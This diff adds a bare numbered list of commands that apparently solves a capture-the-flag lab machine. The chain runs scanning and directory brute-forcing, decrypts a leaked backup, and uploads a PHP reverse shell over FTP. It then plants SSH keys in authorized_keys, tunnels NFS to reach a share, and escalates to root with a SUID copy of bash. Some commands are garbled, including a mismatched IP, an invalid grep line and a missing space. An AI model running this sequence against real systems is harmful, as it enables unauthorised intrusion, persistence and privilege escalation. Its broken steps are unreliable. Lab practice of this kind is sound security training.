@@ -1,0 +1,22 @@
+1 - nmap -A 10.10.75.70
+2 - gobuster dir -u http://10.10.75.70/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+3 - http://10.10.74.70/backups
+4 - gpg --import priv.key
+5 - gpg --decrypt-file CustomerDetails.xlsx.gpg
+6 - ftp 10.10.75.70
+7 - cp /usr/share/webshells/php/php-reverse-shell.php .
+8 - put php-reverse-shell.php
+9 - find / -type f -name "*flag*" 2>/dev/null
+10 - cat /usr/share/httpd/web.flag
+11 - su paradox
+12 - grep -aux (nfs)
+13 - echo "YOUR ID_RSA.PUB" >> /home/paradox/.ssh/authorized_keys
+14 - ssh -L 2049:127.0.0.1:2049 paradox@10.10.75.70
+15 - sudo mount -t nfs -o port=2049 localhost:/ /tmp
+16 - cat /tmp/user.flag
+17 - cat ~/.ssh/id_rsa.pub >> /tmp/.ssh/authorized_keys
+18 - cp /bin/bash /tmp
+19 - chmod +s /tmp/bash
+20 - ssh james@10.10.75.70
+21 - ./bash -p
+22 - cat/root/root.flag
